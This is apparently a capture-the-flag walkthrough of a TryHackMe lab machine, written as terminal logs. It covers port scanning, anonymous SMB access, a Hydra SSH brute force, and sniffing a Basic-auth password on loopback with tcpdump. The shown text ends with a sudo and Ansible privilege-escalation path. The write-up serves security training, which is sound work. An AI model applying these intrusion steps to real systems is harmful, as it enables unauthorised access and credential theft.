----
Do you like reading? Do you like to go through tons of text? Aratus has what you need!
----

![](https://tryhackme-images.s3.amazonaws.com/room-icons/d647822a9c25da0f0489275857ea0cff.jpeg)

![](https://upload.wikimedia.org/wikipedia/commons/1/11/Hellenic_Parliament_from_high_above.jpg)

### Task 2  Get both flags

Good luck!  

Answer the questions below

```
                                                                                                    
┌──(witty㉿kali)-[~]
└─$ rustscan -a 10.10.132.119 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.132.119:22
Open 10.10.132.119:21
Open 10.10.132.119:80
Open 10.10.132.119:139
Open 10.10.132.119:443
Open 10.10.132.119:445
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-22 22:06 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:06
Completed NSE at 22:06, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:06
Completed NSE at 22:06, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:06
Completed NSE at 22:06, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 22:06
Completed Parallel DNS resolution of 1 host. at 22:06, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 22:06
Scanning 10.10.132.119 [6 ports]
Discovered open port 139/tcp on 10.10.132.119
Discovered open port 21/tcp on 10.10.132.119
Discovered open port 443/tcp on 10.10.132.119
Discovered open port 22/tcp on 10.10.132.119
Discovered open port 445/tcp on 10.10.132.119
Discovered open port 80/tcp on 10.10.132.119
Completed Connect Scan at 22:06, 0.18s elapsed (6 total ports)
Initiating Service scan at 22:06
Scanning 6 services on 10.10.132.119
Completed Service scan at 22:06, 13.32s elapsed (6 services on 1 host)
NSE: Script scanning 10.10.132.119.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:06
NSE: [ftp-bounce 10.10.132.119:21] PORT response: 500 Illegal PORT command.
Completed NSE at 22:07, 13.79s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:07
Completed NSE at 22:07, 2.70s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:07
Completed NSE at 22:07, 0.00s elapsed
Nmap scan report for 10.10.132.119
Host is up, received user-set (0.18s latency).
Scanned at 2023-07-22 22:06:34 EDT for 30s

PORT    STATE SERVICE     REASON  VERSION
21/tcp  open  ftp         syn-ack vsftpd 3.0.2
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.19.103
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 0        0               6 Jun 09  2021 pub
22/tcp  open  ssh         syn-ack OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 092362a2186283690440623297ff3ccd (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDakZyfnq0JzwuM1SD3YZ4zyizbtc9AOvhk2qCaTwJHEKyyqIjBaElNv4LpSdtV7y/C6vwUfPS34IO/mAmNtAFquBDjIuoKdw9TjjPrVBVjzFxD/9tDSe+cu6ELPHMyWOQFAYtg1CV1TQlm3p6WIID2IfYBffpfSz54wRhkTJd/+9wgYdOwfe+VRuzV8EgKq4D2cbUTjYjl0dv2f2Th8WtiRksEeaqI1fvPvk6RwyiLdV5mSD/h8HCTZgYVvrjPShW9XPE/wws82/wmVFtOPfY7WAMhtx5kiPB11H+tZSAV/xpEjXQQ9V3Pi6o4vZdUvYSbNuiN4HI4gAWnp/uqPsoR
|   256 33663536b0680632c18af601bc4338ce (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEMyTtxVAKcLy5u87ws+h8WY+GHWg8IZI4c11KX7bOSt85IgCxox7YzOCZbUA56QOlryozIFyhzcwOeCKWtzEsA=
|   256 1498e3847055e6600cc20977f8b7a61c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOKY0jLSRkYg0+fTDrwGOaGW442T5k1qBt7l8iAkcuCk
80/tcp  open  http        syn-ack Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips)
|_http-title: Apache HTTP Server Test Page powered by CentOS
| http-methods: 
|   Supported Methods: GET HEAD POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    syn-ack Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: commonName=aratus/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/emailAddress=root@aratus/localityName=SomeCity/organizationalUnitName=SomeOrganizationalUnit
| Issuer: commonName=aratus/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/emailAddress=root@aratus/localityName=SomeCity/organizationalUnitName=SomeOrganizationalUnit
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-11-23T12:28:26
| Not valid after:  2022-11-23T12:28:26
| MD5:   56ccc5936bdc9168bc7da4b77d3f004e
| SHA-1: 7678b819d2c65dc9515e09eb1e18d772aec7a686
| -----BEGIN CERTIFICATE-----
| MIID0jCCArqgAwIBAgICcOEwDQYJKoZIhvcNAQELBQAwgZ0xCzAJBgNVBAYTAi0t
| MRIwEAYDVQQIDAlTb21lU3RhdGUxETAPBgNVBAcMCFNvbWVDaXR5MRkwFwYDVQQK
| DBBTb21lT3JnYW5pemF0aW9uMR8wHQYDVQQLDBZTb21lT3JnYW5pemF0aW9uYWxV
| bml0MQ8wDQYDVQQDDAZhcmF0dXMxGjAYBgkqhkiG9w0BCQEWC3Jvb3RAYXJhdHVz
| MB4XDTIxMTEyMzEyMjgyNloXDTIyMTEyMzEyMjgyNlowgZ0xCzAJBgNVBAYTAi0t
| MRIwEAYDVQQIDAlTb21lU3RhdGUxETAPBgNVBAcMCFNvbWVDaXR5MRkwFwYDVQQK
| DBBTb21lT3JnYW5pemF0aW9uMR8wHQYDVQQLDBZTb21lT3JnYW5pemF0aW9uYWxV
| bml0MQ8wDQYDVQQDDAZhcmF0dXMxGjAYBgkqhkiG9w0BCQEWC3Jvb3RAYXJhdHVz
| MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAu89vYhIysl0/L4Uy4SK1
| sK3SB/BODuskfXTs3zKKkHhWNQFUru8BRabq5H6JIPdHjel29sE+EXk90Z2VpEHw
| xexm2LHx188DQGE0Sz9nbY4hswQVoVQdTqNbrhPFhUdejpv77tMX/WrUY7APihNY
| jVrLGlATQXaUHIWjUZfQXZr62qE9GJhUoiCGM+5wmHbUYSJWMTTbLYW5quFAWoks
| P7TWjB72dJRlX9mG8IULwzE0Hh1NV3FwPLZ+0GrRrUttCUidu/Be01Zy3cukp8T7
| aS+CtdotN3z7oZ5mOFYr3KWfWZd5jsJVu/gVEBWySG7n61on5IYZJ1XquUv/xE9N
| +wIDAQABoxowGDAJBgNVHRMEAjAAMAsGA1UdDwQEAwIF4DANBgkqhkiG9w0BAQsF
| AAOCAQEAOE+updU9n5lole1A8a2SC6JM1qQDzxpyxBYQH2SQuWyIEviLXztm8XtD
| BodOdWEiVRvuZES3fevXEw6BtfDeDffvyMR5lfGj59V+4RGv4/wBq92oO2Vw8zbZ
| IMZH47zOsI1nNBGw+vYBqNpMnc/NbiRkkXtK0xnM52u6E57HuhsB4n+V28JVTMvx
| njFCQi2Lc1SqJfUMXbPq8Yz+WkJSNyUVXVgZdRjV7ci0mBdbBJMIs/YBCTgfoVc4
| 1teGrFDOz6RVKWyaYLrMw0ZiwCcT5GsvHkFnyWLYM0RZp79tLkuRulAkE0G73n8w
| bUBX774ppOtyCLfxPb27RGf3zFYNww==
|_-----END CERTIFICATE-----
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips
|_http-title: 400 Bad Request
|_ssl-date: TLS randomness does not represent time
445/tcp open  netbios-ssn syn-ack Samba smbd 4.10.16 (workgroup: WORKGROUP)
Service Info: Host: ARATUS; OS: Unix

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 59186/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 64813/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 28118/udp): CLEAN (Failed to receive data)
|   Check 4 (port 46968/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2023-07-23T02:06:53
|_  start_date: N/A
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.10.16)
|   Computer name: aratus
|   NetBIOS computer name: ARATUS\x00
|   Domain name: \x00
|   FQDN: aratus
|_  System time: 2023-07-23T04:06:50+02:00
|_clock-skew: mean: -39m58s, deviation: 1h09m16s, median: 0s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:07
Completed NSE at 22:07, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:07
Completed NSE at 22:07, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:07
Completed NSE at 22:07, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.08 seconds

┌──(witty㉿kali)-[~]
└─$ ftp 10.10.132.119                       
Connected to 10.10.132.119.
220 (vsFTPd 3.0.2)
Name (10.10.132.119:witty): ftp
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||15785|).
150 Here comes the directory listing.
drwxr-xr-x    2 0        0               6 Jun 09  2021 pub
226 Directory send OK.
ftp> ls -lah
229 Entering Extended Passive Mode (|||22622|).

┌──(root㉿kali)-[/home/witty/Downloads]
└─# dirsearch -u http://10.10.132.119/ -i200,301,302,401

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /root/.dirsearch/reports/10.10.132.119/-_23-07-22_22-33-01.txt

Error Log: /root/.dirsearch/logs/errors-23-07-22_22-33-01.log

Target: http://10.10.132.119/

[22:33:01] Starting: 


┌──(witty㉿kali)-[~]
└─$ smbclient -N -L 10.10.132.119                      
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	temporary share Disk      
	IPC$            IPC       IPC Service (Samba 4.10.16)
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------

┌──(witty㉿kali)-[~]
└─$ smbclient -N "\\\\10.10.132.119\\temporary share"
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls -lah
NT_STATUS_NO_SUCH_FILE listing \-lah
smb: \> ls
  .                                   D        0  Mon Jan 10 08:06:44 2022
  ..                                  D        0  Tue Nov 23 11:24:05 2021
  .bash_logout                        H       18  Tue Mar 31 22:17:30 2020
  .bash_profile                       H      193  Tue Mar 31 22:17:30 2020
  .bashrc                             H      231  Tue Mar 31 22:17:30 2020
  .bash_history                       H        0  Sat Jul 22 22:02:20 2023
  chapter1                            D        0  Tue Nov 23 05:07:47 2021
  chapter2                            D        0  Tue Nov 23 05:08:11 2021
  chapter3                            D        0  Tue Nov 23 05:08:18 2021
  chapter4                            D        0  Tue Nov 23 05:08:25 2021
  chapter5                            D        0  Tue Nov 23 05:08:33 2021
  chapter6                            D        0  Tue Nov 23 05:12:24 2021
  chapter7                            D        0  Tue Nov 23 06:14:27 2021
  chapter8                            D        0  Tue Nov 23 05:12:45 2021
  chapter9                            D        0  Tue Nov 23 05:12:53 2021
  .ssh                               DH        0  Mon Jan 10 08:05:34 2022
  .viminfo                            H        0  Sat Jul 22 22:02:20 2023
  message-to-simeon.txt               N      251  Mon Jan 10 08:06:44 2022

		37726212 blocks of size 1024. 35597080 blocks available

Simeon,

Stop messing with your home directory, you are moving files and directories insecurely!
Just make a folder in /opt for your book project...

Also you password is insecure, could you please change it? It is all over the place now!

- Theodore

smb: \> cd .ssh
smb: \.ssh\> ls
NT_STATUS_ACCESS_DENIED listing \.ssh\*

┌──(witty㉿kali)-[~]
└─$ smbclient -N "\\\\10.10.132.119\\temporary share"
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls -lah
NT_STATUS_NO_SUCH_FILE listing \-lah
smb: \> ls
  .                                   D        0  Mon Jan 10 08:06:44 2022
  ..                                  D        0  Tue Nov 23 11:24:05 2021
  .bash_logout                        H       18  Tue Mar 31 22:17:30 2020
  .bash_profile                       H      193  Tue Mar 31 22:17:30 2020
  .bashrc                             H      231  Tue Mar 31 22:17:30 2020
  .bash_history                       H        0  Sat Jul 22 22:02:20 2023
  chapter1                            D        0  Tue Nov 23 05:07:47 2021
  chapter2                            D        0  Tue Nov 23 05:08:11 2021
  chapter3                            D        0  Tue Nov 23 05:08:18 2021
  chapter4                            D        0  Tue Nov 23 05:08:25 2021
  chapter5                            D        0  Tue Nov 23 05:08:33 2021
  chapter6                            D        0  Tue Nov 23 05:12:24 2021
  chapter7                            D        0  Tue Nov 23 06:14:27 2021
  chapter8                            D        0  Tue Nov 23 05:12:45 2021
  chapter9                            D        0  Tue Nov 23 05:12:53 2021
  .ssh                               DH        0  Mon Jan 10 08:05:34 2022
  .viminfo                            H        0  Sat Jul 22 22:02:20 2023
  message-to-simeon.txt               N      251  Mon Jan 10 08:06:44 2022

		37726212 blocks of size 1024. 35597080 blocks available
smb: \> more message-to-simeon.txt
getting file \message-to-simeon.txt of size 251 as /tmp/smbmore.c5Y51I (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \> more message-to-simeon.txt
getting file \message-to-simeon.txt of size 251 as /tmp/smbmore.KOc9fm (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \> more .viminfo
NT_STATUS_ACCESS_DENIED opening remote file \.viminfo
smb: \> cd .ssh
smb: \.ssh\> ls
NT_STATUS_ACCESS_DENIED listing \.ssh\*
smb: \.ssh\> more .bash_history
NT_STATUS_ACCESS_DENIED opening remote file \.ssh\.bash_history
smb: \.ssh\> cd chapter1
cd \.ssh\chapter1\: NT_STATUS_ACCESS_DENIED
smb: \.ssh\> cd chapter2
cd \.ssh\chapter2\: NT_STATUS_ACCESS_DENIED
smb: \.ssh\> exit

┌──(witty㉿kali)-[~]
└─$ smbclient -N "\\\\10.10.132.119\\temporary share"
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> mget *
Get file .bash_logout? 
Get file .bash_profile? 
Get file .bashrc? 
Get file .bash_history? 
Get file .viminfo? 
Get file message-to-simeon.txt? 

http://10.10.132.119/simeon/

┌──(witty㉿kali)-[~]
└─$ cewl http://10.10.132.119/simeon/ > wordlist_simeon
                                                                                        
┌──(witty㉿kali)-[~]
└─$ more wordlist_simeon             
CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
orci
quam
sit
amet
tellus
non
pulvinar

┌──(witty㉿kali)-[~]
└─$ hydra -l simeon -P wordlist_simeon ssh://10.10.132.119 -t 64
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-07-22 22:45:05
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 207 login tries (l:1/p:207), ~4 tries per task
[DATA] attacking ssh://10.10.132.119:22/
[22][ssh] host: 10.10.132.119   login: simeon   password: scelerisque
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 23 final worker threads did not complete until end.
[ERROR] 23 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-07-22 22:45:22

┌──(witty㉿kali)-[~]
└─$ ssh simeon@10.10.132.119                         
The authenticity of host '10.10.132.119 (10.10.132.119)' can't be established.
ED25519 key fingerprint is SHA256:rRttffFIyZasFZ3kH1UCuXbqoQKD5nKQWgtEudn7nys.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:92: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.132.119' (ED25519) to the list of known hosts.
simeon@10.10.132.119's password: 
Last failed login: Sun Jul 23 04:45:24 CEST 2023 from ip-10-8-19-103.eu-west-1.compute.internal on ssh:notty
There were 40 failed login attempts since the last successful login.
Last login: Mon Jan 10 14:07:52 2022 from 172.16.42.100
[simeon@aratus ~]$ id
uid=1003(simeon) gid=1003(simeon) groups=1003(simeon) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[simeon@aratus ~]$ ls
chapter1  chapter3  chapter5  chapter7  chapter9
chapter2  chapter4  chapter6  chapter8  message-to-simeon.txt
[simeon@aratus ~]$ cd /home
[simeon@aratus home]$ ls
automation  simeon  theodore
[simeon@aratus home]$ cd simeon/
[simeon@aratus ~]$ ls
chapter1  chapter3  chapter5  chapter7  chapter9
chapter2  chapter4  chapter6  chapter8  message-to-simeon.txt
[simeon@aratus ~]$ ls -lah
total 20K
drwxr-xr-x. 12 simeon   simeon 4.0K Jan 10  2022 .
drwxr-xr-x.  5 root     root     54 Nov 23  2021 ..
lrwxrwxrwx.  1 simeon   simeon    9 Nov 23  2021 .bash_history -> /dev/null
-rw-r--r--.  1 simeon   simeon   18 Apr  1  2020 .bash_logout
-rw-r--r--.  1 simeon   simeon  193 Apr  1  2020 .bash_profile
-rw-r--r--.  1 simeon   simeon  231 Apr  1  2020 .bashrc
drwxr-xr-x.  5 simeon   simeon   66 Nov 23  2021 chapter1
drwxr-xr-x.  7 simeon   simeon  106 Nov 23  2021 chapter2
drwxr-xr-x.  6 simeon   simeon   86 Nov 23  2021 chapter3
drwxr-xr-x.  6 simeon   simeon   86 Nov 23  2021 chapter4
drwxr-xr-x.  4 simeon   simeon   46 Nov 23  2021 chapter5
drwxr-xr-x.  5 simeon   simeon   66 Nov 23  2021 chapter6
drwxr-xr-x.  4 simeon   simeon   46 Nov 23  2021 chapter7
drwxr-xr-x.  6 simeon   simeon   86 Nov 23  2021 chapter8
drwxr-xr-x.  7 simeon   simeon  106 Nov 23  2021 chapter9
-rw-r--r--.  1 theodore root    251 Jan 10  2022 message-to-simeon.txt
drwx------.  2 simeon   simeon   29 Jan 10  2022 .ssh
lrwxrwxrwx.  1 root     root      9 Dec  2  2021 .viminfo -> /dev/null
[simeon@aratus ~]$ cd ../theodore/
-bash: cd: ../theodore/: Permission denied
[simeon@aratus ~]$ cd ../automation/
-bash: cd: ../automation/: Permission denied

[simeon@aratus ~]$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for simeon: 
Sorry, user simeon may not run sudo on aratus.
[simeon@aratus ~]$ find / -perm -4000 -type f -exec ls -al {} 2>/dev/null \;
-rws--x--x. 1 root root 23968 Feb  2  2021 /usr/bin/chfn
-rws--x--x. 1 root root 23880 Feb  2  2021 /usr/bin/chsh
-rwsr-xr-x. 1 root root 44264 Feb  2  2021 /usr/bin/mount
-rwsr-xr-x. 1 root root 73888 Aug  9  2019 /usr/bin/chage
-rwsr-xr-x. 1 root root 78408 Aug  9  2019 /usr/bin/gpasswd
-rwsr-xr-x. 1 root root 41936 Aug  9  2019 /usr/bin/newgrp
-rwsr-xr-x. 1 root root 32128 Feb  2  2021 /usr/bin/su
-rwsr-xr-x. 1 root root 31984 Feb  2  2021 /usr/bin/umount
---s--x--x. 1 root root 151424 Oct 14  2021 /usr/bin/sudo
-rwsr-xr-x. 1 root root 27672 Jan 25  2022 /usr/bin/pkexec
-rwsr-xr-x. 1 root root 57576 Jan 13  2022 /usr/bin/crontab
-rwsr-xr-x. 1 root root 27856 Apr  1  2020 /usr/bin/passwd
-rwsr-xr-x. 1 root root 11232 Apr  1  2020 /usr/sbin/pam_timestamp_check
-rwsr-xr-x. 1 root root 36272 Apr  1  2020 /usr/sbin/unix_chkpwd
-rwsr-xr-x. 1 root root 11296 Nov 16  2020 /usr/sbin/usernetctl
-rwsr-xr-x. 1 root root 15432 Jan 25  2022 /usr/lib/polkit-1/polkit-agent-helper-1
-rwsr-x---. 1 root dbus 57936 Sep 30  2020 /usr/libexec/dbus-1/dbus-daemon-launch-helper
[simeon@aratus ~]$ getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_admin,cap_net_raw+p
/usr/bin/newgidmap = cap_setgid+ep
/usr/bin/newuidmap = cap_setuid+ep
/usr/sbin/arping = cap_net_raw+p
/usr/sbin/clockdiff = cap_net_raw+p
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
/usr/sbin/suexec = cap_setgid,cap_setuid+ep

[simeon@aratus ~]$ ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:00:29:35:6d:53 brd ff:ff:ff:ff:ff:ff
    inet 10.10.132.119/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2296sec preferred_lft 2296sec
    inet6 fe80::29ff:fe35:6d53/64 scope link 
       valid_lft forever preferred_lft forever

- `tcpdump`: This is the command-line utility for capturing and analyzing network packets.
- `-i lo`: This option specifies the network interface to capture packets from, in this case, the loopback interface ("lo").
- `-A`: This option tells tcpdump to print each packet's payload (data) in ASCII format, making it human-readable.

[simeon@aratus ~]$ tcpdump -i lo -A

04:53:01.984008 IP localhost.32980 > localhost.http: Flags [.], ack 1, win 683, options [nop,nop,TS val 2812161 ecr 2812161], length 0
E..4Q
@.@..............P.r.	.^.0.....(.....
.*...*..
04:53:01.984239 IP localhost.32980 > localhost.http: Flags [P.], seq 1:224, ack 1, win 683, options [nop,nop,TS val 2812161 ecr 2812161], length 223: HTTP: GET /test-auth/index.html HTTP/1.1
E...Q.@.@..............P.r.	.^.0...........
.*...*..GET /test-auth/index.html HTTP/1.1
Host: 127.0.0.1
User-Agent: python-requests/2.14.2
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Authorization: Basic dGhlb2RvcmU6UmlqeWFzd2FoZWJjZWliYXJqaWs=


04:53:01.984258 IP localhost.http > localhost.32980: Flags [.], ack 224, win 700, options [nop,nop,TS val 2812161 ecr 2812161], length 0
E..4@1@.@............P...^.0.r.......(.....
.*...*..
04:53:01.984708 IP localhost.http > localhost.32980: Flags [P.], seq 1:428, ack 224, win 700, options [nop,nop,TS val 2812162 ecr 2812161], length 427: HTTP: HTTP/1.1 200 OK
E...@2@.@............P...^.0.r.............
.*...*..HTTP/1.1 200 OK
Date: Sun, 23 Jul 2023 02:53:01 GMT
Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips
Last-Modified: Tue, 23 Nov 2021 13:08:49 GMT
ETag: "6d-5d1747131d500"
Accept-Ranges: bytes
Content-Length: 109
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html>
<body>
<h1>Hello there!</h1>
<p>If you read this, the curl command was succesful!</p>
</body>
</html>
78 packets captured
156 packets received by filter
0 packets dropped by kernel

echo "dGhlb2RvcmU6UmlqeWFzd2FoZWJjZWliYXJqaWs=" | base64 -d
theodore:Rijyaswahebceibarjik

[simeon@aratus ~]$ su theodore
Password: 
[theodore@aratus simeon]$ cd /home/theodore/
[theodore@aratus ~]$ ls
scripts  user.txt
[theodore@aratus ~]$ cat user.txt 
THM{ba8d3b87bfdb9d10115cbe24feabbc20}

[theodore@aratus scripts]$ cat test-www-auth.py 
#!/usr/bin/python3

import requests

url = "http://127.0.0.1/test-auth/index.html"
headers = {"Authorization" : "Basic dGhlb2RvcmU6UmlqeWFzd2FoZWJjZWliYXJqaWs="}

r = requests.get(url, headers=headers)
print(r)

[theodore@aratus scripts]$ sudo -l
Matching Defaults entries for theodore on aratus:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS
    DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS
    LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY
    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User theodore may run the following commands on aratus:
    (automation) NOPASSWD: /opt/scripts/infra_as_code.sh

[theodore@aratus scripts]$ cat /opt/scripts/infra_as_code.sh
#!/bin/bash
cd /opt/ansible
/usr/bin/ansible-playbook /opt/ansible/playbooks/*.yaml

[theodore@aratus scripts]$ cd /opt/ansible/playbooks/
[theodore@aratus playbooks]$ ls
firewalld.yaml  httpd.yaml  smbd.yaml  sshd.yaml  vsftpd.yaml
[theodore@aratus playbooks]$ ls -lah
total 20K
drwxr-xr-x. 2 automation automation  99 Nov 23  2021 .
drwxr-x---. 4 automation theodore    90 Nov 23  2021 ..
-rw-r--r--. 1 automation automation 156 Nov 23  2021 firewalld.yaml
-rw-r--r--. 1 automation automation 312 Nov 23  2021 httpd.yaml
-rw-r--r--. 1 automation automation 140 Nov 23  2021 smbd.yaml
-rw-r--r--. 1 automation automation 138 Nov 23  2021 sshd.yaml
-rw-r--r--. 1 automation automation 145 Nov 23  2021 vsftpd.yaml
[theodore@aratus playbooks]$ cd ..
[theodore@aratus ansible]$ ls
ansible.cfg  inventory  playbooks  README.txt  roles
[theodore@aratus ansible]$ cd roles/
[theodore@aratus roles]$ ls -lah
total 0
drwxr-xr-x. 3 automation automation  32 Nov 23  2021 .
drwxr-x---. 4 automation theodore    90 Nov 23  2021 ..
drwxr-xr-x. 9 automation automation 178 Dec  2  2021 geerlingguy.apache
[theodore@aratus roles]$ cd geerlingguy.apache/
[theodore@aratus geerlingguy.apache]$ ls -lah
total 24K
drwxr-xr-x. 9 automation automation  178 Dec  2  2021 .
drwxr-xr-x. 3 automation automation   32 Nov 23  2021 ..
-rw-rw-r--. 1 automation automation   38 Dec  2  2021 .ansible-lint
drwxr-xr-x. 2 automation automation   22 Dec  2  2021 defaults
drwxr-xr-x. 2 automation automation   22 Dec  2  2021 handlers
-rw-rw-r--. 1 automation automation 1.1K Dec  2  2021 LICENSE
drwxr-xr-x. 2 automation automation   50 Dec  2  2021 meta
drwxr-xr-x. 3 automation automation   21 Dec  2  2021 molecule
-rw-rw-r--. 1 automation automation 8.2K Dec  2  2021 README.md
drwxr-xr-x. 2 automation automation  228 Dec  2  2021 tasks
drwxr-xr-x. 2 automation automation   28 Dec  2  2021 templates
drwxr-xr-x. 2 automation automation  142 Dec  2  2021 vars
-rw-rw-r--. 1 automation automation  121 Dec  2  2021 .yamllint
[theodore@aratus geerlingguy.apache]$ cd tasks/
[theodore@aratus tasks]$ ls -lah
total 36K
drwxr-xr-x. 2 automation automation  228 Dec  2  2021 .
drwxr-xr-x. 9 automation automation  178 Dec  2  2021 ..
-rw-rw-r--. 1 automation automation 1.7K Dec  2  2021 configure-Debian.yml
-rw-rw-r--+ 1 automation automation 1.1K Dec  2  2021 configure-RedHat.yml
